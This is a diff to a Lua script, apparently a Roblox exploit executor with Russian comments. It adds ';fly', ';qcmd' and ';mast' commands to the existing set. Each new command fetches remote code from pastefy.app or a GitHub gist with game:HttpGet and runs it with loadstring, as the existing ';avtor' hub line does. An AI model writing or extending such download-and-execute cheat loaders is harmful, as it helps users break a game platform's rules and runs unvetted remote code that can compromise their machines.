@@ -233,7 +233,10 @@ local commands = {
     ";tel1",
     ";tel2",
     ";glios",
-    ";cmds"
+    ";cmds",
+    ";fly", -- Новая команда
+    ";qcmd", -- Новая команда
+    ";mast" -- Новая команда
 }
 
 -- Обработчик нажатия кнопки Execute
@@ -241,7 +244,13 @@ executeButton.MouseButton1Click:Connect(function()
     local codeToExecute = textBox.Text
     if codeToExecute == ";cmds" then
         -- Выводим список команд в текстовое поле
-        textBox.Text = "Существующие команды:\n" .. table.concat(commands, "\n")
+        textBox.Text = "Существующие команды:\n" .. table.concat(commands, "\n") .. "\n\nНовые команды:\n;fly\n;qcmd\n;mast"
+    elseif codeToExecute == ";fly" then
+        loadstring(game:HttpGet(('https://pastefy.app/M0N30XXG/raw'),true))()
+    elseif codeToExecute == ";qcmd" then
+        loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
+    elseif codeToExecute == ";mast" then
+        loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
     elseif codeToExecute == ";avtor" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/Avtor1zaTion/Avtor/main/AvtorHub'))()
     elseif codeToExecute == ";gh" then
